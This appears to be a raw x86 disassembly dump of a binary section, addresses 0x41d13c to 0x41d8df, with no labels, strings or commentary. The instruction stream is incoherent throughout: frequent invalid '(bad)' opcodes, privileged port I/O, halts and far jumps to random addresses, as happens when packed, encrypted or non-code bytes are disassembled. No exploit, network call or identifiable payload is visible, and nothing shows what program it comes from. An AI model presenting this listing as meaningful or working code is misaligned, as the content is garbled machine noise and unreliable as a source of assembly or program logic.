  41d13c:	or     dl,BYTE PTR [eax]
  41d13e:	sbb    cl,BYTE PTR [ecx+eax*2-0x37]
  41d142:	mov    ecx,0x3cdbc6ab
  41d147:	aam    0x53
  41d149:	imul   esi,DWORD PTR [ebp-0x309973f3],0x2e
  41d150:	mov    bh,0x79
  41d152:	dec    esi
  41d153:	cmp    DWORD PTR [ecx],0x1f
  41d156:	enter  0x9f4e,0x8
  41d15a:	loope  0x41d124
  41d15c:	cmp    al,0x8
  41d15e:	mov    ebx,0xddb7c7fd
  41d163:	sbb    edx,ecx
  41d165:	xor    DWORD PTR [ebp-0x24],eax
  41d168:	outs   dx,BYTE PTR ds:[esi]
  41d169:	xchg   ecx,eax
  41d16a:	xchg   bl,al
  41d16c:	stos   BYTE PTR es:[edi],al
  41d16d:	iret   
  41d16e:	mov    ?,WORD PTR [ecx-0x164d199b]
  41d174:	jmp    0xd72a3f6d
  41d179:	cmp    cl,BYTE PTR [eax-0x9]
  41d17c:	mov    bh,0x79
  41d17e:	mov    bl,0xcd
  41d180:	clc    
  41d181:	stos   DWORD PTR es:[edi],eax
  41d182:	sub    edi,ebx
  41d184:	and    BYTE PTR [esi+edi*8-0x2b524ead],ch
  41d18b:	xlat   BYTE PTR ds:[ebx]
  41d18c:	cli    
  41d18d:	mov    eax,ds:0xfdb8182b
  41d192:	push   es
  41d193:	frstor [ecx]
  41d195:	push   ecx
  41d196:	fucomp st(1)
  41d198:	in     al,dx
  41d199:	mul    eax
  41d19b:	dec    ecx
  41d19c:	fimul  DWORD PTR [ebp+0x15]
  41d19f:	mov    eax,ss
  41d1a1:	mov    edx,DWORD PTR [eax]
  41d1a3:	mov    esp,0x10a36cc7
  41d1a8:	daa    
  41d1a9:	lea    esi,[esi]
  41d1ab:	ret    0x7a0c
  41d1ae:	jle    0x41d214
  41d1b0:	(bad)  
  41d1b1:	sub    bl,BYTE PTR [edx]
  41d1b3:	dec    ebx
  41d1b4:	mov    eax,ds:0xfcbbd80f
  41d1b9:	ja     0x41d183
  41d1bb:	inc    esi
  41d1bc:	jge    0x41d199
  41d1be:	xor    eax,0x8ce5e35e
  41d1c3:	stos   DWORD PTR es:[edi],eax
  41d1c4:	dec    si
  41d1c6:	sti    
  41d1c7:	ret    
  41d1c8:	rcl    DWORD PTR [edi],cl
  41d1ca:	imul   esi,DWORD PTR [ebx],0x2a84d97f
  41d1d0:	mov    DWORD PTR [edi+0xa2b521f],edx
  41d1d6:	pusha  
  41d1d7:	add    bl,ah
  41d1d9:	cmc    
  41d1da:	leave  
  41d1db:	dec    ecx
  41d1dc:	(bad)  
  41d1dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1de:	(bad)  
  41d1df:	push   ds
  41d1e0:	call   0xfd4722d8
  41d1e5:	add    eax,0x33fd41f7
  41d1ea:	test   al,0xdc
  41d1ec:	inc    edi
  41d1ed:	or     edi,edx
  41d1ef:	sub    al,0x45
  41d1f1:	or     al,0x53
  41d1f3:	stos   BYTE PTR es:[edi],al
  41d1f4:	in     al,0xa2
  41d1f6:	je     0x41d185
  41d1f8:	sti    
  41d1f9:	mov    cl,0x8b
  41d1fb:	xchg   cl,ch
  41d1fd:	dec    esi
  41d1fe:	repnz inc ebx
  41d200:	cmc    
  41d201:	ss jge 0x41d22f
  41d204:	add    esi,DWORD PTR [edx+ecx*2]
  41d207:	nop
  41d208:	push   esp
  41d209:	pop    ecx
  41d20a:	ret    
  41d20b:	sub    al,ah
  41d20d:	mov    al,ds:0x3ede16f6
  41d212:	pop    ss
  41d213:	pop    esp
  41d214:	das    
  41d215:	mov    DWORD PTR [eax+0x75b78826],ebp
  41d21b:	push   esp
  41d21c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d21d:	and    bl,BYTE PTR [edi+ebx*1-0x5ee251b6]
  41d224:	mov    ss,esi
  41d226:	and    al,0xaf
  41d228:	jle    0x41d274
  41d22a:	repnz and bh,ah
  41d22d:	arpl   cx,bx
  41d22f:	inc    ebx
  41d230:	sti    
  41d231:	ds ja  0x41d215
  41d234:	(bad)  
  41d235:	stos   DWORD PTR es:[edi],eax
  41d236:	jae    0x41d29b
  41d238:	mov    bh,0xdd
  41d23a:	pusha  
  41d23b:	fmul   QWORD PTR [edx]
  41d23d:	es jge 0x41d212
  41d240:	jnp    0x41d296
  41d242:	in     eax,dx
  41d243:	aam    0x80
  41d245:	bound  esp,QWORD PTR [esi+0x66]
  41d248:	adc    ah,BYTE PTR [ebp+0x347da2d9]
  41d24e:	aas    
  41d24f:	mov    ebp,0xa33a69e7
  41d254:	xor    DWORD PTR [eax+0x44971f18],0xe0c87253
  41d25e:	and    BYTE PTR ds:0x1036f982,cl
  41d264:	retf   
  41d265:	pop    edi
  41d266:	sbb    dh,BYTE PTR [bx+si]
  41d269:	adc    al,0x39
  41d26b:	stc    
  41d26c:	popa   
  41d26d:	neg    DWORD PTR [ebx+0x2f]
  41d270:	and    DWORD PTR ds:0x411709f,ebp
  41d276:	and    DWORD PTR [eax+0x2befadcc],ebp
  41d27c:	sbb    DWORD PTR [edi],edi
  41d27e:	sub    DWORD PTR [edx+0x1e498d38],ebx
  41d284:	sub    dh,bh
  41d286:	adc    BYTE PTR [ebx],0x71
  41d289:	shl    DWORD PTR [ecx+0x403a7863],cl
  41d28f:	mov    BYTE PTR [ebx],bl
  41d291:	mov    al,ds:0x82247c33
  41d296:	inc    ecx
  41d297:	pop    esi
  41d298:	xchg   ecx,eax
  41d299:	(bad)  
  41d29a:	jb     0x41d22d
  41d29c:	xor    al,0x2b
  41d29e:	jl     0x41d241
  41d2a0:	adc    DWORD PTR [eax-0x5c8d13c3],edx
  41d2a6:	mov    edi,0x1d646d0d
  41d2ab:	test   BYTE PTR [eax+ebp*8],ah
  41d2ae:	push   0x5b
  41d2b0:	and    DWORD PTR [ebx],0x361da119
  41d2b6:	(bad)  
  41d2b7:	dec    esp
  41d2b8:	sbb    eax,0x5204cbc3
  41d2bd:	sub    BYTE PTR [edx+0x94ab8a7],dl
  41d2c3:	rcl    ah,1
  41d2c5:	xchg   ecx,eax
  41d2c6:	sub    eax,0x21ce3c9a
  41d2cb:	stos   DWORD PTR es:[edi],eax
  41d2cc:	pop    ebx
  41d2cd:	out    0xe,eax
  41d2cf:	sbb    al,ah
  41d2d1:	inc    eax
  41d2d2:	pop    ds
  41d2d3:	out    dx,eax
  41d2d4:	call   0xd2df47a5
  41d2d9:	lea    edi,[edi+0x146b27bb]
  41d2df:	ror    DWORD PTR [ebx-0x367fafa0],0x12
  41d2e6:	cdq    
  41d2e7:	inc    esp
  41d2e8:	mov    al,ss:0x181c6f3a
  41d2ee:	daa    
  41d2ef:	mov    DWORD PTR [eax+eax*8+0x7c2eddf6],esi
  41d2f6:	xchg   edx,eax
  41d2f7:	push   0x86734ea2
  41d2fc:	rcr    BYTE PTR ds:0xd6d4f94d,0xff
  41d303:	icebp  
  41d304:	fadd   QWORD PTR [ebx+edx*2]
  41d307:	jg     0x41d30c
  41d309:	jg     0x41d36b
  41d30b:	fsub   DWORD PTR [ebx+0x4a]
  41d30e:	xchg   ecx,eax
  41d30f:	ins    DWORD PTR es:[edi],dx
  41d310:	mov    BYTE PTR [eiz*2-0x205e12b0],bl
  41d317:	(bad)  
  41d318:	ficom  DWORD PTR [ecx]
  41d31a:	fisub  WORD PTR [ebp+0x4f]
  41d31d:	jecxz  0x41d32f
  41d31f:	rol    DWORD PTR [edi+0x51e2aa4d],0xfe
  41d326:	inc    BYTE PTR [ebx]
  41d328:	daa    
  41d329:	push   es
  41d32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d32b:	loopne 0x41d386
  41d32d:	push   edx
  41d32e:	retf   0xb1da
  41d331:	(bad)  
  41d332:	sub    eax,0x6d503f6e
  41d337:	inc    eax
  41d338:	and    esp,DWORD PTR [eax+ebx*4]
  41d33b:	sbb    ebx,esp
  41d33d:	xchg   BYTE PTR [edi+0x79e4bb62],al
  41d343:	test   eax,0x151aa670
  41d348:	sahf   
  41d349:	gs bswap edi
  41d34c:	add    dl,BYTE PTR [edx]
  41d34e:	inc    esi
  41d34f:	ret    0x6b33
  41d352:	lea    ecx,[edi]
  41d354:	mov    bl,bh
  41d356:	test   DWORD PTR [ecx],0xfc90d056
  41d35c:	adc    ah,0xdf
  41d35f:	inc    ebx
  41d360:	push   eax
  41d361:	aam    0xa
  41d363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d364:	ficomp WORD PTR [ebx]
  41d366:	leave  
  41d367:	push   ebx
  41d368:	mov    DWORD PTR [ebp+0x76c38dd],ecx
  41d36e:	inc    ecx
  41d36f:	xchg   ecx,eax
  41d370:	mov    al,0x28
  41d372:	and    cl,bl
  41d374:	mov    eax,0x3c7971d6
  41d379:	jb     0x41d2fe
  41d37b:	outs   dx,DWORD PTR ds:[esi]
  41d37c:	push   ebx
  41d37d:	push   ss
  41d37e:	bound  esp,QWORD PTR [edi+0x1]
  41d381:	fcomp  DWORD PTR [ecx-0x3a]
  41d384:	(bad)  
  41d385:	xchg   edx,eax
  41d386:	mov    esp,0x7210b125
  41d38b:	fidivr WORD PTR [eax-0x677062ba]
  41d391:	sti    
  41d392:	pushf  
  41d393:	mov    ebp,0x8ab47a1f
  41d398:	xor    DWORD PTR [eax-0x10885ecc],eax
  41d39e:	sub    ebx,ebp
  41d3a0:	add    BYTE PTR [ebx+0x4e],bh
  41d3a3:	jbe    0x41d3fe
  41d3a5:	jns    0x41d41e
  41d3a7:	mov    ebp,0xb352cc4b
  41d3ac:	jmp    0x41d390
  41d3ae:	xchg   ebx,eax
  41d3af:	jo     0x41d383
  41d3b1:	adc    eax,0xb13ab8f7
  41d3b6:	inc    ebx
  41d3b7:	sub    DWORD PTR [ebx],esi
  41d3b9:	push   es
  41d3ba:	aaa    
  41d3bb:	add    BYTE PTR [edx+edx*1+0x73],bh
  41d3bf:	dec    edx
  41d3c0:	hlt    
  41d3c1:	lds    edx,FWORD PTR [esp+ecx*8]
  41d3c4:	cmp    al,0xfb
  41d3c6:	pusha  
  41d3c7:	data16 stc 
  41d3c9:	loopne 0x41d444
  41d3cb:	sub    dh,BYTE PTR [ebx]
  41d3cd:	popf   
  41d3ce:	mov    bh,0x61
  41d3d0:	popa   
  41d3d1:	aam    0x77
  41d3d3:	leave  
  41d3d4:	sub    cl,BYTE PTR [ebp+0x2d]
  41d3d7:	dec    ebx
  41d3d8:	loope  0x41d43f
  41d3da:	adc    al,0x4e
  41d3dc:	enter  0x19de,0x51
  41d3e0:	test   eax,0xba3df331
  41d3e5:	pop    esi
  41d3e6:	imul   DWORD PTR [edx+0x21]
  41d3e9:	test   eax,0x957fd7ba
  41d3ee:	cmp    al,al
  41d3f0:	mov    ds:0x262cce64,eax
  41d3f5:	loop   0x41d42f
  41d3f7:	adc    eax,0xd5a32e63
  41d3fc:	test   eax,0xd03c4969
  41d401:	(bad)  
  41d402:	cwde   
  41d403:	add    eax,0xd15b1613
  41d408:	and    DWORD PTR [ebx+0x543506a5],esp
  41d40e:	(bad)  
  41d40f:	xor    BYTE PTR [esi+edx*4+0x8],dl
  41d413:	jbe    0x41d3fe
  41d415:	(bad)  
  41d416:	sar    BYTE PTR [esi+0x26fd01a7],0xc2
  41d41d:	jle    0x41d438
  41d41f:	push   ss
  41d420:	pop    ebx
  41d421:	or     eax,0x21daad9b
  41d426:	shl    DWORD PTR [ebx+0x6105fb27],0xe6
  41d42d:	mov    al,0xa8
  41d42f:	in     al,dx
  41d430:	ja     0x41d45e
  41d432:	mov    cl,0xe0
  41d434:	fistp  WORD PTR [edx+0x4aa44384]
  41d43a:	leave  
  41d43b:	pop    edx
  41d43c:	mov    dl,BYTE PTR [esi]
  41d43e:	in     eax,dx
  41d43f:	test   eax,0xd7b86fcc
  41d444:	jmp    0xc1ea:0x46d8bb00
  41d44b:	shr    ch,cl
  41d44d:	pop    es
  41d44e:	sbb    bh,al
  41d450:	push   eax
  41d451:	jl     0x41d48c
  41d453:	in     eax,0x6c
  41d455:	push   edx
  41d456:	gs cli 
  41d458:	pop    ecx
  41d459:	dec    edi
  41d45a:	jp     0x41d48b
  41d45c:	lds    edi,FWORD PTR [eax+edx*4-0x1c5ce0e8]
  41d463:	push   0xa9e5d224
  41d468:	int    0xd9
  41d46a:	test   eax,0xf60e44f6
  41d46f:	aad    0xb8
  41d471:	mov    bl,0x8c
  41d473:	inc    esp
  41d474:	or     eax,0x1218e2bf
  41d479:	mov    DWORD PTR [esi-0x7d],0x27ef6d89
  41d480:	mov    ebx,0x28844cf8
  41d485:	or     ah,BYTE PTR [edi-0x54]
  41d488:	fcom   DWORD PTR [ecx]
  41d48a:	adc    al,0x31
  41d48c:	jnp    0x41d426
  41d48e:	dec    eax
  41d48f:	mov    ebp,0xed3cfc1f
  41d494:	cmp    bl,BYTE PTR [eax-0x9c54403]
  41d49a:	(bad)  
  41d49b:	sahf   
  41d49c:	and    eax,0xe45e89c3
  41d4a1:	mov    bh,0x65
  41d4a3:	push   0xe0deaea0
  41d4a8:	push   ecx
  41d4a9:	pop    edi
  41d4aa:	adc    al,0x40
  41d4ac:	ins    BYTE PTR es:[edi],dx
  41d4ad:	push   esp
  41d4ae:	jmp    0x8102f8f0
  41d4b3:	stos   BYTE PTR es:[edi],al
  41d4b4:	imul   edx,DWORD PTR [eax+0x40],0x37
  41d4b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4b9:	sub    esp,DWORD PTR [edi-0x47]
  41d4bc:	push   es
  41d4bd:	pop    esi
  41d4be:	les    ebx,FWORD PTR [eax-0x74]
  41d4c1:	shl    BYTE PTR [ebp+0x3f],cl
  41d4c4:	and    eax,DWORD PTR [ecx-0x18cb28e4]
  41d4ca:	pop    ss
  41d4cb:	jo     0x41d4f3
  41d4cd:	mov    ds:0xd71b8abe,eax
  41d4d2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4d4:	leave  
  41d4d5:	pop    ebp
  41d4d6:	out    0xaf,eax
  41d4d8:	je     0x41d46a
  41d4da:	sbb    DWORD PTR [edx-0x7fa30756],0xffffff8e
  41d4e1:	jbe    0x41d4dc
  41d4e3:	cdq    
  41d4e4:	mov    dl,0x5a
  41d4e6:	ficom  DWORD PTR ds:0x73aedcbb
  41d4ec:	addr16 mov edi,0x64b9df4f
  41d4f2:	cmp    DWORD PTR [edi],esp
  41d4f4:	push   ebp
  41d4f5:	clc    
  41d4f6:	call   FWORD PTR [ebx-0x1890e353]
  41d4fc:	or     ebx,DWORD PTR [edx-0x6498144f]
  41d502:	test   DWORD PTR [ecx+eiz*1-0x37],0xbb004c59
  41d50a:	fsub   DWORD PTR [esi-0x72]
  41d50d:	xor    esi,edx
  41d50f:	imul   ebx,DWORD PTR [edx],0x689af59a
  41d515:	push   cs
  41d516:	or     BYTE PTR [eax],dh
  41d518:	or     al,0xcf
  41d51a:	stos   DWORD PTR es:[edi],eax
  41d51b:	lock and bh,BYTE PTR [esi+eax*8]
  41d51f:	mov    al,ds:0x7e267f5c
  41d524:	aas    
  41d525:	push   esp
  41d526:	xlat   BYTE PTR ds:[ebx]
  41d527:	popa   
  41d528:	jl     0x41d596
  41d52a:	daa    
  41d52b:	and    BYTE PTR [eax],bl
  41d52d:	repnz cmp al,0xff
  41d530:	ss cmp eax,0xb4dc285e
  41d536:	inc    edi
  41d537:	not    DWORD PTR [ecx+esi*4-0x64]
  41d53b:	sbb    edi,DWORD PTR [bp+0x71]
  41d53f:	ret    
  41d540:	jecxz  0x41d4f0
  41d542:	(bad)  
  41d543:	mov    ecx,0xf2160c46
  41d548:	and    dh,BYTE PTR [eax-0x4d168a13]
  41d54e:	cmp    al,0x4d
  41d550:	test   dl,0xb5
  41d553:	cmp    BYTE PTR [esi+ebx*8+0x39],dl
  41d557:	jp     0x41d567
  41d559:	or     bl,0x4c
  41d55c:	jle    0x41d555
  41d55e:	mov    eax,ds:0x444b06f2
  41d563:	jae    0x41d588
  41d565:	mov    cl,0x68
  41d567:	(bad)  
  41d568:	lods   al,BYTE PTR ds:[esi]
  41d569:	daa    
  41d56a:	fs je  0x41d5a3
  41d56d:	dec    esi
  41d56e:	ss sbb cl,ch
  41d571:	icebp  
  41d572:	fadd   QWORD PTR [eax-0x167c139b]
  41d578:	gs (bad) 
  41d57a:	adc    edi,edx
  41d57c:	addr16 hlt 
  41d57e:	push   ebx
  41d57f:	jle    0x41d5b3
  41d581:	fcomp  DWORD PTR [edi-0x3a]
  41d584:	adc    BYTE PTR [ebx+0x15a99c4c],0x38
  41d58b:	adc    BYTE PTR [edi+0x3b],al
  41d58e:	jp     0x41d51d
  41d590:	and    DWORD PTR [ecx-0x1f09aaab],esi
  41d596:	mov    bl,0xd9
  41d598:	(bad)  
  41d599:	js     0x41d5e6
  41d59b:	sbb    eax,0x6cbe5e9e
  41d5a0:	adc    al,0xf2
  41d5a2:	stos   BYTE PTR es:[edi],al
  41d5a3:	pop    edx
  41d5a4:	aam    0x7f
  41d5a6:	xor    bl,cl
  41d5a8:	jmp    0x3c3ae240
  41d5ad:	jae    0x41d609
  41d5af:	iret   
  41d5b0:	rcl    BYTE PTR [edx+0x575a2c43],0xa9
  41d5b7:	data16 (bad) 
  41d5b9:	mov    bl,0xc4
  41d5bb:	mov    bh,0x2d
  41d5bd:	push   ds
  41d5be:	mov    edx,0x6f8ce246
  41d5c3:	mov    eax,ds:0x447c7f90
  41d5c8:	idiv   DWORD PTR [ecx+0x61f5a4d]
  41d5ce:	cmp    eax,DWORD PTR [edx-0x3f00d3b3]
  41d5d4:	(bad)  
  41d5d5:	jl     0x41d595
  41d5d7:	imul   ecx
  41d5d9:	jecxz  0x41d648
  41d5db:	call   0xfa8c:0xd6e93c06
  41d5e2:	mov    esi,0xb9a4475f
  41d5e7:	lds    ebx,FWORD PTR [esi-0x245ed257]
  41d5ed:	loop   0x41d60e
  41d5ef:	mov    edx,0xc6449655
  41d5f4:	ds pop eax
  41d5f6:	mov    ah,0x6a
  41d5f8:	jp     0x41d5eb
  41d5fa:	inc    esi
  41d5fb:	lock pusha 
  41d5fd:	fcmovbe st,st(6)
  41d5ff:	or     al,0xc6
  41d601:	xor    eax,DWORD PTR [edi+ebp*8-0x64789c02]
  41d608:	outs   dx,BYTE PTR ds:[esi]
  41d609:	jnp    0x41d65d
  41d60b:	(bad)  
  41d60c:	out    0x9b,al
  41d60e:	mov    esp,0xeb69781a
  41d613:	pop    es
  41d614:	je     0x41d5b5
  41d616:	adc    bl,ah
  41d618:	mov    edx,0x3b5845d
  41d61d:	into   
  41d61e:	cmc    
  41d61f:	mov    bh,0xb4
  41d621:	mov    dh,BYTE PTR [ebx]
  41d623:	or     eax,0x4aa2daa3
  41d628:	adc    edi,DWORD PTR [esi+0x39]
  41d62b:	jb     0x41d66c
  41d62d:	es inc ecx
  41d62f:	(bad)  
  41d630:	iret   
  41d631:	es push edx
  41d633:	pop    ds
  41d634:	ds pop ebp
  41d636:	out    dx,al
  41d637:	pusha  
  41d638:	adc    eax,0xc15699d6
  41d63d:	sub    ebx,DWORD PTR [ebx]
  41d63f:	into   
  41d640:	push   ebx
  41d641:	adc    DWORD PTR [ecx+0xbc8aa99],ecx
  41d647:	pop    eax
  41d648:	xchg   edi,eax
  41d649:	sar    BYTE PTR [edx+0x7ea5e828],1
  41d64f:	pop    eax
  41d650:	aad    0xc5
  41d652:	dec    esp
  41d653:	scas   eax,DWORD PTR es:[edi]
  41d654:	je     0x41d603
  41d656:	lods   eax,DWORD PTR ds:[esi]
  41d657:	(bad)  
  41d658:	push   edi
  41d659:	ss stc 
  41d65b:	mov    ch,0x48
  41d65d:	in     al,0xf7
  41d65f:	imul   eax,DWORD PTR [eax],0x72
  41d662:	lahf   
  41d663:	sub    al,dl
  41d665:	cmp    eax,0xd215790e
  41d66a:	retf   
  41d66b:	pop    ecx
  41d66c:	icebp  
  41d66d:	jno    0x41d6ad
  41d66f:	mov    ah,0xee
  41d671:	stc    
  41d672:	cs js  0x41d6d7
  41d675:	adc    ecx,DWORD PTR [ecx-0x66]
  41d678:	sub    DWORD PTR [ecx+0x49523bdb],ebx
  41d67e:	out    0xae,eax
  41d680:	sbb    BYTE PTR [esi],ah
  41d682:	in     al,dx
  41d683:	je     0x41d660
  41d685:	and    al,bh
  41d687:	scas   eax,DWORD PTR es:[edi]
  41d688:	cmp    WORD PTR [edi],di
  41d68b:	fdivr  st(7),st
  41d68d:	xchg   ebp,eax
  41d68e:	or     eax,0xd483e221
  41d693:	pop    ecx
  41d694:	pop    esp
  41d695:	pop    ss
  41d696:	es dec ebx
  41d698:	mov    bl,0xd
  41d69a:	mov    WORD PTR [eax],?
  41d69c:	mov    ch,BYTE PTR [esi-0x5436dda5]
  41d6a2:	or     ebx,DWORD PTR [eax]
  41d6a4:	mov    ecx,0x4831adfe
  41d6a9:	pop    ds
  41d6aa:	push   0x600a7962
  41d6af:	loope  0x41d6db
  41d6b1:	jno    0x41d6dc
  41d6b3:	fnsave [ebp-0x4b9b681d]
  41d6b9:	jmp    0xc583:0xd80afd8d
  41d6c0:	adc    eax,0x180e3d2f
  41d6c5:	js     0x41d6a4
  41d6c7:	aas    
  41d6c8:	dec    esi
  41d6c9:	cmp    DWORD PTR [ecx+0x2cd60cd7],ebp
  41d6cf:	add    BYTE PTR [ecx+0x29],0x4
  41d6d3:	mov    BYTE PTR [edi],bh
  41d6d5:	mov    esi,0xc4bd4246
  41d6da:	dec    esp
  41d6db:	sub    ecx,DWORD PTR [ebp-0x257b83bf]
  41d6e1:	mov    al,0x9e
  41d6e3:	inc    edx
  41d6e4:	xor    al,0xa9
  41d6e6:	and    eax,0x66030a2
  41d6eb:	xchg   DWORD PTR [esi+0x6162bb0e],edx
  41d6f1:	push   0x21391193
  41d6f6:	mov    al,BYTE PTR [edi+eiz*1]
  41d6f9:	xor    al,0xfc
  41d6fb:	inc    esi
  41d6fc:	das    
  41d6fd:	mov    dh,0x12
  41d6ff:	sbb    eax,0xc90699ab
  41d704:	pop    ecx
  41d705:	test   BYTE PTR ss:[ecx-0x2a],al
  41d709:	lods   al,BYTE PTR ds:[esi]
  41d70a:	pop    ds
  41d70b:	hlt    
  41d70c:	in     eax,dx
  41d70d:	rcr    DWORD PTR [esp+ebx*2],cl
  41d710:	dec    ecx
  41d711:	xor    eax,0x961d0b0
  41d716:	xor    al,0x55
  41d718:	jecxz  0x41d6b3
  41d71a:	mov    ch,0xad
  41d71c:	in     al,0x6a
  41d71e:	ficom  WORD PTR [ebx]
  41d720:	inc    ebp
  41d721:	into   
  41d722:	mov    ebx,0xd41c421b
  41d727:	pop    edi
  41d728:	push   edx
  41d729:	jmp    0x8c342204
  41d72e:	stc    
  41d72f:	mul    DWORD PTR [eax]
  41d731:	(bad)
  41d735:	ficomp DWORD PTR [ebx]
  41d737:	std    
  41d738:	mov    BYTE PTR [edi],al
  41d73a:	into   
  41d73b:	mov    ecx,0x24e8d538
  41d740:	sar    BYTE PTR [esp+esi*2-0x473d6871],0x5a
  41d748:	jecxz  0x41d74f
  41d74a:	in     eax,dx
  41d74b:	hlt    
  41d74c:	fnstcw WORD PTR [ebx+0x2c9dff0f]
  41d752:	jbe    0x41d7aa
  41d754:	xchg   edx,eax
  41d755:	ret    0x3863
  41d758:	scas   al,BYTE PTR es:[edi]
  41d759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d75a:	push   0xbf9951f6
  41d75f:	daa    
  41d760:	(bad)  
  41d761:	hlt    
  41d762:	shl    ch,0x9e
  41d765:	pop    ds
  41d766:	repz in al,dx
  41d768:	adc    edi,DWORD PTR [ecx+0x27812ed0]
  41d76e:	loope  0x41d798
  41d770:	add    DWORD PTR [edi],esp
  41d772:	adc    BYTE PTR [ecx],bh
  41d774:	inc    ebx
  41d775:	pop    es
  41d776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d777:	and    ecx,DWORD PTR [eax]
  41d779:	neg    BYTE PTR [edx+0x2a9adb08]
  41d77f:	pop    esp
  41d780:	outs   dx,BYTE PTR ds:[esi]
  41d781:	jo     0x41d7a2
  41d783:	pop    ds
  41d784:	and    al,BYTE PTR [eax+0x46e41fc8]
  41d78a:	test   eax,0x9bc71815
  41d78f:	in     eax,dx
  41d790:	lods   eax,DWORD PTR ds:[esi]
  41d791:	cwde   
  41d792:	or     DWORD PTR [ecx+0x67],eax
  41d795:	cwde   
  41d796:	out    dx,eax
  41d797:	or     DWORD PTR [edi],edx
  41d799:	cli    
  41d79a:	mov    ch,0xaf
  41d79c:	ins    BYTE PTR es:[edi],dx
  41d79d:	out    0x84,eax
  41d79f:	mov    esp,DWORD PTR [eax]
  41d7a1:	xor    ebx,0x12
  41d7a4:	out    0x22,eax
  41d7a6:	(bad)  
  41d7a7:	jmp    0x41d7c6
  41d7a9:	jo     0x41d7ba
  41d7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7ac:	cmp    BYTE PTR [esi-0x60],dh
  41d7af:	pushf  
  41d7b0:	pop    edx
  41d7b1:	jmp    0x3dc437a5
  41d7b6:	mov    bl,0x68
  41d7b8:	pop    ss
  41d7b9:	loope  0x41d82a
  41d7bb:	sub    al,0x11
  41d7bd:	mov    ebx,0x3e78ac6f
  41d7c2:	xor    eax,0x198b4e5e
  41d7c7:	iret   
  41d7c8:	xor    dl,al
  41d7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7cb:	xor    BYTE PTR [ebx+0x3f],al
  41d7ce:	xchg   ecx,eax
  41d7cf:	add    dl,BYTE PTR [edi+0x3faed7e6]
  41d7d5:	shr    DWORD PTR [edx-0x75706840],0xda
  41d7dc:	cmp    cl,BYTE PTR [edx+ecx*4+0x3]
  41d7e0:	fcomip st,st(2)
  41d7e2:	nop
  41d7e3:	(bad)  
  41d7e4:	in     al,0xa7
  41d7e6:	mov    esi,0x1f25828b
  41d7eb:	ret    0xc554
  41d7ee:	out    dx,eax
  41d7ef:	dec    ebx
  41d7f0:	mov    ?,WORD PTR [edi]
  41d7f2:	scas   al,BYTE PTR es:[edi]
  41d7f3:	mov    ah,0x86
  41d7f5:	and    DWORD PTR [ebx-0x75],0x62f820cf
  41d7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7fd:	mov    BYTE PTR [esp+ebx*8],0x32
  41d801:	push   edi
  41d802:	xor    al,0xf8
  41d804:	jmp    0x41d82d
  41d806:	outs   dx,BYTE PTR ds:[esi]
  41d807:	mov    ds:0xa658b722,eax
  41d80c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d80d:	sub    al,BYTE PTR ds:0x839d6242
  41d813:	fadd   QWORD PTR [edi+0x6]
  41d816:	(bad)  
  41d817:	rcr    DWORD PTR [esi+0x11e82a81],1
  41d81d:	sbb    al,BYTE PTR [esi-0x54]
  41d820:	pop    ebx
  41d821:	adc    ecx,DWORD PTR [ebx-0x7ad4a7c2]
  41d827:	or     al,cl
  41d829:	mov    esi,0x6c0bf02b
  41d82e:	add    edi,DWORD PTR [edi]
  41d830:	adc    ah,BYTE PTR [esp+edi*8-0x31]
  41d834:	xor    eax,0xacf70816
  41d839:	jp     0x41d894
  41d83b:	enter  0x7723,0x47
  41d83f:	cs pop esi
  41d841:	cmp    BYTE PTR [esi+eax*4-0x256e675b],ah
  41d848:	idiv   ebp
  41d84a:	or     eax,0xe052a988
  41d84f:	inc    eax
  41d850:	mov    BYTE PTR [esi+0x3e],cl
  41d853:	mov    ebp,DWORD PTR [ebp+0x5cbc174e]
  41d859:	imul   edx,ebx,0xffffffd7
  41d85c:	and    ch,dl
  41d85e:	or     al,0x40
  41d860:	or     DWORD PTR [ebp-0x1f],esp
  41d863:	mov    bh,0x7
  41d865:	mov    al,ds:0xbf0ae746
  41d86a:	adc    BYTE PTR [ebp+0x3d],0x23
  41d86e:	mov    gs,WORD PTR ds:0x7e487c82
  41d874:	add    eax,0x3ae19356
  41d879:	jmp    DWORD PTR [ebp-0x2da66390]
  41d87f:	push   edi
  41d880:	in     eax,dx
  41d881:	sbb    al,0x71
  41d883:	shl    dh,0xb8
  41d886:	cld    
  41d887:	mov    ch,0xd6
  41d889:	clc    
  41d88a:	dec    ecx
  41d88b:	and    BYTE PTR [eax+ebx*2+0x14],cl
  41d88f:	jmp    0x18102e8f
  41d894:	ficom  WORD PTR [esi+ecx*4+0x7c22361c]
  41d89b:	fwait
  41d89c:	and    DWORD PTR [ebx],ebp
  41d89e:	mov    ch,0x8e
  41d8a0:	aam    0x30
  41d8a2:	js     0x41d831
  41d8a4:	outs   dx,BYTE PTR ss:[esi]
  41d8a6:	int    0x22
  41d8a8:	xchg   edi,eax
  41d8a9:	push   ebx
  41d8aa:	sbb    esi,esp
  41d8ac:	test   BYTE PTR [edx+ebx*1+0x4d],al
  41d8b0:	xchg   ebp,esi
  41d8b2:	(bad)
  41d8b5:	inc    esp
  41d8b6:	dec    ecx
  41d8b7:	push   esi
  41d8b8:	pop    ds
  41d8b9:	ja     0x41d8a7
  41d8bb:	repz cmp ch,BYTE PTR [edx]
  41d8be:	mov    al,0x48
  41d8c0:	adc    esp,eax
  41d8c2:	pop    ds
  41d8c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8c4:	addr16 push 0xa94ae720
  41d8ca:	scas   al,BYTE PTR es:[edi]
  41d8cb:	mov    esi,0xbf390984
  41d8d0:	xchg   ecx,eax
  41d8d1:	call   DWORD PTR [esi+0x34d379cb]
  41d8d7:	dec    esi
  41d8d8:	shl    DWORD PTR [ebp-0x27],0xfa
  41d8dc:	ret    0x415c
  41d8df:	out    dx,eax
